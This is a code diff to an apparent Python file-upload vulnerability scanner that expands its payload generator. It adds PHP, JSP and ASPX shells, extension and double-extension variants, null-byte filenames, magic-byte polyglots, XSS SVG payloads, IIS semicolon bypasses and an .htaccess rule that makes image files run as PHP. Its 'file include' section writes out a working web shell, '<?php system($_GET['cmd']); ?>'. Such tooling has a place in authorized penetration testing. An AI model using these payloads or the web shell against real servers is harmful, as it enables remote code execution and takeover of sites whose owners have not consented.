@@ -25,6 +25,7 @@ class AsyncScanner:
         self.analyzer = AsyncResponseAnalyzer()
         self.results = []
         self.running = False
+        self.max_payloads = 200  # 【新增】默认Payload数量限制
     
     async def scan(self, 
                    target_url: str, 
@@ -37,6 +38,7 @@ class AsyncScanner:
                    on_traffic_callback: Optional[Callable[[TrafficLog], None]] = None,
                    on_finding_callback: Optional[Callable[[VulnerabilityFinding], None]] = None,
                    on_result_callback: Optional[Callable[[dict], None]] = None,
+                   max_payloads: int = 200,  # 【新增】Payload数量限制
                    progress_callback: Optional[Callable[[str, int], None]] = None) -> ScanResult:
         """执行扫描"""
         self.running = True
@@ -59,8 +61,8 @@ class AsyncScanner:
         if on_log_callback:
             on_log_callback(f"开始扫描: {target_url}")
         
-        # 生成payloads
-        payloads = self._generate_payloads()
+        # 生成payloads - 【修复】使用max_payloads限制
+        payloads = self._generate_payloads(max_payloads)
         total = len(payloads)
         
         for i, payload in enumerate(payloads):
@@ -262,9 +264,12 @@ class AsyncScanner:
         
         return result
     
-    def _generate_payloads(self) -> List[dict]:
-        """生成所有测试payloads"""
+    def _generate_payloads(self, max_limit: int = 200) -> List[dict]:
+        """【修复】生成测试payloads，支持自定义数量限制"""
         payloads = []
+        
+        # 使用传入的限制，或默认值
+        max_payloads = max_limit if max_limit else 200
         
         # 1. 标准WebShell
         php_content = b"<?php echo 'UploadForge_Test_Success_' . (23 * 2); ?>"
@@ -275,8 +280,8 @@ class AsyncScanner:
         payloads.append({"type": "jsp_shell", "ext": "jsp", "content": jsp_content, "desc": "标准JSP Shell"})
         payloads.append({"type": "aspx_shell", "ext": "aspx", "content": aspx_content, "desc": "标准ASPX Shell"})
         
-        # 2. PHP变体
-        php_variants = ["pHp", "PHP", "php5", "phtml", "php7", "phar", "phps"]
+        # 2. PHP变体 - 【新增】更多变体
+        php_variants = ["pHp", "PHP", "php5", "phtml", "php7", "phar", "phps", "php4", "php3", "pht"]
         for ext in php_variants:
             payloads.append({
                 "type": f"php_variant_{ext}",
@@ -285,11 +290,14 @@ class AsyncScanner:
                 "desc": f"PHP变体 .{ext}"
             })
         
-        # 3. 双扩展名
+        # 3. 双扩展名 - 【新增】更多组合
         base_name = "shell"
         double_exts = [
-            ("php", "jpg"), ("php", "png"), ("php", "gif"),
-            ("jsp", "jpg"), ("asp", "txt"), ("php", "txt")
+            ("php", "jpg"), ("php", "png"), ("php", "gif"), ("php", "bmp"),
+            ("php", "txt"), ("php", "pdf"), ("php", "doc"), ("php", "zip"),
+            ("jsp", "jpg"), ("jsp", "png"), ("jsp", "gif"),
+            ("asp", "txt"), ("aspx", "jpg"), ("aspx", "png"),
+            ("jpg", "php"), ("png", "php"), ("gif", "php"), ("txt", "php")
         ]
         
         for malicious, safe in double_exts:
@@ -297,27 +305,29 @@ class AsyncScanner:
                 "type": f"double_ext_{malicious}_{safe}",
                 "ext": f"{malicious}.{safe}",
                 "filename": f"{base_name}.{malicious}.{safe}",
-                "content": php_content if malicious == "php" else b"test",
+                "content": php_content if malicious == "php" else (jsp_content if malicious == "jsp" else aspx_content),
                 "desc": f"双扩展名 .{malicious}.{safe}"
             })
+        
+        # 4. 空字节注入 - 【新增】更多变体
+        null_byte_variants = [
+            ("shell.php%00.jpg", "php%00.jpg"),
+            ("shell.php%2500.jpg", "php%2500.jpg"),
+            ("shell.php\\x00.jpg", "php\\x00.jpg"),
+            ("shell.php\\0.jpg", "php\\0.jpg"),
+            ("shell.php%2500.png", "php%2500.png"),
+            ("shell.php%2500.gif", "php%2500.gif"),
+        ]
+        for filename, ext in null_byte_variants:
             payloads.append({
-                "type": f"double_ext_{safe}_{malicious}",
-                "ext": f"{safe}.{malicious}",
-                "filename": f"{base_name}.{safe}.{malicious}",
-                "content": php_content if malicious == "php" else b"test",
-                "desc": f"双扩展名 .{safe}.{malicious}"
+                "type": "null_byte_injection",
+                "ext": ext,
+                "filename": filename,
+                "content": php_content,
+                "desc": f"空字节注入 {filename}"
             })
         
-        # 4. 空字节注入
-        payloads.append({
-            "type": "null_byte_injection",
-            "ext": "php",
-            "filename": "shell.php%00.jpg",
-            "content": php_content,
-            "desc": "空字节注入 shell.php%00.jpg"
-        })
-        
-        # 5. Polyglots / 魔术字节
+        # 5. Polyglots / 魔术字节 - 【新增】更多类型
         gif_polyglot = b"GIF89a" + php_content
         payloads.append({
             "type": "polyglot_gif",
@@ -327,7 +337,6 @@ class AsyncScanner:
             "desc": "GIF89a Polyglot"
         })
         
-        # PNG魔术字节
         png_magic = b"\x89PNG\r\n\x1a\n"
         png_content = png_magic + php_content
         payloads.append({
@@ -338,9 +347,30 @@ class AsyncScanner:
             "desc": "PNG魔术字节 + PHP"
         })
         
-        # 6. XSS SVG
-        svg_content = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'UploadForge\')"></svg>'
-        payloads.append({"type": "xss_svg", "ext": "svg", "content": svg_content, "desc": "XSS via SVG"})
+        jpg_magic = b"\xff\xd8\xff\xe0\x00\x10JFIF"
+        jpg_content = jpg_magic + php_content
+        payloads.append({
+            "type": "magic_jpg",
+            "ext": "php",
+            "filename": "image.jpg.php",
+            "content": jpg_content,
+            "desc": "JPEG魔术字节 + PHP"
+        })
+        
+        # 6. XSS SVG - 【新增】更多XSS payload
+        svg_payloads = [
+            b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'UploadForge\')"></svg>',
+            b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
+            b'<svg/onload=alert(document.domain)>',
+            b'<img src=x onerror=alert(1)>',
+        ]
+        for i, svg in enumerate(svg_payloads):
+            payloads.append({
+                "type": f"xss_svg_{i}",
+                "ext": "svg",
+                "content": svg,
+                "desc": f"XSS via SVG #{i+1}"
+            })
         
         # 7. EICAR测试文件
         eicar_content = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
@@ -364,7 +394,7 @@ class AsyncScanner:
             "desc": "NTFS备用数据流 shell.php::$DATA"
         })
         
-        # 10. 分号绕过 (IIS)
+        # 10. 分号绕过 (IIS) - 【新增】更多变体
         payloads.append({
             "type": "semicolon_bypass",
             "ext": "php",
@@ -372,8 +402,51 @@ class AsyncScanner:
             "content": aspx_content,
             "desc": "分号绕过 (IIS) shell.asp;.jpg"
         })
+        payloads.append({
+            "type": "semicolon_bypass_jsp",
+            "ext": "jsp",
+            "filename": "shell.jsp;.jpg",
+            "content": jsp_content,
+            "desc": "分号绕过 (IIS) shell.jsp;.jpg"
+        })
         
-        return payloads
+        # 11. 【新增】.htaccess 攻击
+        htaccess_content = b"AddType application/x-httpd-php .jpg .png .gif\n"
+        payloads.append({
+            "type": "htaccess_attack",
+            "ext": "htaccess",
+            "filename": ".htaccess",
+            "content": htaccess_content,
+            "desc": ".htaccess 文件攻击"
+        })
+        
+        # 12. 【新增】文件包含 payload
+        include_payloads = [
+            ("shell.php.txt", b"<?php system($_GET['cmd']); ?>"),
+            ("config.php.bak", b"<?php system($_GET['cmd']); ?>"),
+            ("index.php~", b"<?php system($_GET['cmd']); ?>"),
+        ]
+        for filename, content in include_payloads:
+            payloads.append({
+                "type": "file_include",
+                "ext": filename.split('.')[-1],
+                "filename": filename,
+                "content": content,
+                "desc": f"文件包含 {filename}"
+            })
+        
+        # 13. 【新增】更多 ASP/ASPX 变体
+        asp_variants = ["asp", "asa", "cer", "aspx", "ashx", "asmx", "asax"]
+        for ext in asp_variants:
+            payloads.append({
+                "type": f"asp_variant_{ext}",
+                "ext": ext,
+                "content": aspx_content,
+                "desc": f"ASP变体 .{ext}"
+            })
+        
+        # 【修复】使用传入的max_limit参数限制返回数量
+        return payloads[:max_limit]
     
     def stop(self):
         """停止扫描"""
